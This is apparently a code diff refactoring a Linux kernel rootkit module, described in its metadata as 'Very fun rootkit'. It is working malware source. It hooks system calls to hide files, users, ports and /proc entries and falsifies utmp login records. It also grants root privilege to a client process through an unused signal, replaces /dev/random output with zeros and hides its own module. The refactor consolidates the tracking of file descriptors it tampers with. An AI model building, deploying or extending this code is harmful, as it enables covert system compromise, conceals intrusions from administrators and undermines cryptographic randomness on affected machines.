@@ -8,24 +8,17 @@
 #include <linux/seq_file.h>
 #include <net/sock.h>
 #include <net/tcp.h>
-#include "pe.h"
+#include "privilege.h"
+#include "track.h"
 #include "mod_hiding.h"
 #include "hooking.h"
 #include "utmp.h"
+#include "config.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
 MODULE_VERSION("1.0.0");
-
-// Prefix of files that we wish to hide
-#define ROOTI_HIDE_PREFIX "secret"
-
-// User to hide
-#define ROOTI_HIDE_USER "omri"
-
-// Port number to hide from tools like netstat
-#define ROOTI_HIDE_PORT 8080
 
 // Unused signal numbers can, be used by the rootkit for its own purposes
 enum rooti_signals {
@@ -42,28 +35,23 @@ struct rooti_client_proc {
     char name[NAME_MAX];  // PID of the client, but as a string (filename in /proc)
 };
 
-/*
-    This struct stores some file descriptor that is of interest to us which was opened
-    by some usermode process. This struct would be initialized in a hook for some open-like syscall
-    and read in a hook for some read-like or write-like syscall whenever we want to tamper with file I/O.
-*/
-struct rooti_tamper_fd {
-    int fd;                 // file descriptor number
-    pid_t pid;              // PID of the owner
-    struct list_head head;  // linked list head
-};
-
 // Userspace process serviced by this rootkit
 static struct rooti_client_proc rooti_client = { .pid = 0 };
 
 // List of FDs to /dev/random or /dev/urandom opened by userspace processes
-static LIST_HEAD(rooti_random_tamper_fds);
+static LIST_HEAD(rooti_random_tracked_fds);
 
 // List of /proc directory FDs opened by userspace processes
-static LIST_HEAD(rooti_proc_tamper_fds);
+static LIST_HEAD(rooti_proc_tracked_fds);
 
 // List of FDs of /var/run/utmp opened by userspace processes
-static LIST_HEAD(rooti_utmp_tamper_fds);
+static LIST_HEAD(rooti_utmp_tracked_fds);
+
+struct list_head *rooti_tracked_fds_lists[] = {
+    &rooti_random_tracked_fds,
+    &rooti_proc_tracked_fds,
+    &rooti_utmp_tracked_fds
+};
 
 // References to the original syscall handlers which we are hooking
 static asmlinkage long (*rooti_orig_kill)(const struct pt_regs *regs);
@@ -89,8 +77,6 @@ static int rooti_register_client(pid_t pid)
     return rooti_elevate_privilege();
 }
 
-
-
 static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
@@ -113,8 +99,7 @@ static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
 
 static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
 {
-    // Allocate a kernel buffer for the filename
-    struct rooti_tamper_fd *tamper_fd = NULL;
+    // Allocate a kernel buffer to store the requested filename
     char *filepath_user = (char *)regs->si;
     char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
     if (filepath_kernel == NULL) {
@@ -129,97 +114,40 @@ static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
         kfree(filepath_kernel);
         return rooti_orig_openat(regs);
     }
+
+    // Invoke the original syscall
+    int fd = rooti_orig_openat(regs);
     
     // Check if the requested file to open is one of the two Linux char devices providing random bytes
     if (strncmp(filepath_kernel, "/dev/random", NAME_MAX) == 0 || strncmp(filepath_kernel, "/dev/urandom", NAME_MAX) == 0) {
-        pid_t pid = current->pid;
-        int fd = rooti_orig_openat(regs);
-
-        // Allocate a new record of an open fd
-        tamper_fd = kmalloc(sizeof(*tamper_fd), GFP_KERNEL);
-        if (tamper_fd == NULL) {
-            printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-            return fd;
-        }
-        tamper_fd->pid = pid;
-        tamper_fd->fd = fd;
-
-        // Append the new record
-        INIT_LIST_HEAD(&tamper_fd->head);
-        list_add_tail(&tamper_fd->head, &rooti_random_tamper_fds);
-
-        kfree(filepath_kernel);
-        return fd;
+        err = rooti_track_fd(fd, &rooti_random_tracked_fds);
     }
-    // Check if the requested file to open is the /proc directory
+    // Check if the requested file to open is the /proc VFS directory
     else if (strncmp(filepath_kernel, "/proc", NAME_MAX) == 0) {
-        pid_t pid = current->pid;
-        int fd = rooti_orig_openat(regs);
-
-        // Allocate a new record of an open fd
-        tamper_fd = kmalloc(sizeof(*tamper_fd), GFP_KERNEL);
-        if (tamper_fd == NULL) {
-            printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-            return fd;
-        }
-        tamper_fd->pid = pid;
-        tamper_fd->fd = fd;
-
-        // Append the new record
-        INIT_LIST_HEAD(&tamper_fd->head);
-        list_add_tail(&tamper_fd->head, &rooti_proc_tamper_fds);
-
-        kfree(filepath_kernel);
-        return fd;
+        err = rooti_track_fd(fd, &rooti_proc_tracked_fds);
     }
+    // Check if the requested file to open is the utmp file storing login records
     else if (strncmp(filepath_kernel, "/var/run/utmp", NAME_MAX) == 0) {
-        pid_t pid = current->pid;
-        int fd = rooti_orig_openat(regs);
-
-        // Allocate a new record of an open fd
-        tamper_fd = kmalloc(sizeof(*tamper_fd), GFP_KERNEL);
-        if (tamper_fd == NULL) {
-            printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-            return fd;
-        }
-        tamper_fd->pid = pid;
-        tamper_fd->fd = fd;
-
-        // Append the new record
-        INIT_LIST_HEAD(&tamper_fd->head);
-        list_add_tail(&tamper_fd->head, &rooti_utmp_tamper_fds);
-
-        kfree(filepath_kernel);
-        return fd; 
+        err = rooti_track_fd(fd, &rooti_utmp_tracked_fds);
     }
 
     kfree(filepath_kernel);
-    return rooti_orig_openat(regs);
+    return fd;
 }
 
 static asmlinkage long rooti_hook_close(const struct pt_regs *regs)
 {
     pid_t pid = current->pid;
     int fd = regs->di;
+    struct rooti_tracked_fd *record;
+    struct rooti_tracked_fd *tmp;
 
-    // If present, remove the open FD from the list of tampared FDs
-    struct rooti_tamper_fd *record, *tmp;
-    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
-        if (pid == record->pid && fd == record->fd) {
-            list_del(&record->head);
-            kfree(record);
-        }
-    }
-    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
-        if (pid == record->pid && fd == record->fd) {
-            list_del(&record->head);
-            kfree(record);
-        }
-    }
-    list_for_each_entry_safe(record, tmp, &rooti_utmp_tamper_fds, head) {
-        if (pid == record->pid && fd == record->fd) {
-            list_del(&record->head);
-            kfree(record);
+    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
+        // If present, remove the recorded FD
+        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
+            if (pid == record->pid && fd == record->fd) {
+                rooti_untrack_fd(record);
+            }
         }
     }
     return rooti_orig_close(regs);
@@ -231,53 +159,15 @@ static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs)
     int oldfd = regs->di;
     int newfd = rooti_orig_dup2(regs);
 
-    // If present, update the FD of the tampered file.
-    struct rooti_tamper_fd *record;
-    struct rooti_tamper_fd *tmp;
-    struct rooti_tamper_fd *new;
-    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
-        if (pid == record->pid && oldfd == record->fd) {
-            // Append new record for duplicated FD
-            new = kmalloc(sizeof(*new), GFP_KERNEL);
-            if (new == NULL) {
-                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-                return newfd;
-            }
-            new->pid = pid;
-            new->fd = newfd; 
+    struct rooti_tracked_fd *record;
+    struct rooti_tracked_fd *tmp;
 
-            INIT_LIST_HEAD(&new->head);
-            list_add_tail(&new->head, &rooti_random_tamper_fds);
-        }
-    }
-    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
-        if (pid == record->pid && oldfd == record->fd) {
-            // Append new record for duplicated FD
-            new = kmalloc(sizeof(*new), GFP_KERNEL);
-            if (new == NULL) {
-                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-                return newfd;
+    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
+        // If present, duplicate the recorded FD
+        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
+            if (pid == record->pid && oldfd == record->fd) {
+                rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
             }
-            new->pid = pid;
-            new->fd = newfd; 
-
-            INIT_LIST_HEAD(&new->head);
-            list_add_tail(&new->head, &rooti_proc_tamper_fds);
-        }
-    }
-    list_for_each_entry_safe(record, tmp, &rooti_utmp_tamper_fds, head) {
-        if (pid == record->pid && oldfd == record->fd) {
-            // Append new record for duplicated FD
-            new = kmalloc(sizeof(*new), GFP_KERNEL);
-            if (new == NULL) {
-                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-                return newfd;
-            }
-            new->pid = pid;
-            new->fd = newfd; 
-
-            INIT_LIST_HEAD(&new->head);
-            list_add_tail(&new->head, &rooti_utmp_tamper_fds);
         }
     }
     return newfd;
@@ -291,8 +181,8 @@ static asmlinkage long rooti_hook_read(const struct pt_regs *regs)
     size_t count = regs->dx;
     size_t nread = rooti_orig_read(regs);
     
-    struct rooti_tamper_fd *record;
-    list_for_each_entry(record, &rooti_random_tamper_fds, head)  {
+    struct rooti_tracked_fd *record;
+    list_for_each_entry(record, &rooti_random_tracked_fds, head)  {
         if (pid == record->pid && fd == record->fd) {
             // Allocate kernel buffer filled with zeros
             char *kernel_buf = kzalloc(count, GFP_KERNEL);
@@ -325,8 +215,8 @@ static asmlinkage long rooti_hook_pread64(const struct pt_regs *regs) {
     // Invoke the original syscall
     size_t nread = rooti_orig_pread64(regs);
 
-    struct rooti_tamper_fd *record;
-    list_for_each_entry(record, &rooti_utmp_tamper_fds, head)  {
+    struct rooti_tracked_fd *record;
+    list_for_each_entry(record, &rooti_utmp_tracked_fds, head)  {
         if (pid == record->pid && fd == record->fd) {
             kernel_buf = kmalloc(count, GFP_KERNEL);
             if (kernel_buf == NULL) {
@@ -384,8 +274,8 @@ static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
 
     // Check if the directory FD is of /proc
     bool is_proc_dir = false;
-    struct rooti_tamper_fd *record;
-    list_for_each_entry(record, &rooti_proc_tamper_fds, head) {
+    struct rooti_tracked_fd *record;
+    list_for_each_entry(record, &rooti_proc_tracked_fds, head) {
         if (current->pid == record->pid && fd == record->fd) {
             is_proc_dir = true;
             break;
@@ -491,18 +381,14 @@ static void __exit rooti_exit(void)
     printk(KERN_INFO "rooti: exit\n");
     rooti_uninstall_hooks(hooks, ARRAY_SIZE(hooks));
 
-    struct rooti_tamper_fd *record, *tmp;
-    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
-        list_del(&record->head);
-        kfree(record);
-    }
-    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
-        list_del(&record->head);
-        kfree(record);
-    }
-    list_for_each_entry_safe(record, tmp, &rooti_utmp_tamper_fds, head) {
-        list_del(&record->head);
-        kfree(record);
+    struct rooti_tracked_fd *record;
+    struct rooti_tracked_fd *tmp;
+
+    // Release any remaining records
+    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
+        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
+            rooti_untrack_fd(record);
+        }
     }
 
     rooti_unprotect_memory();
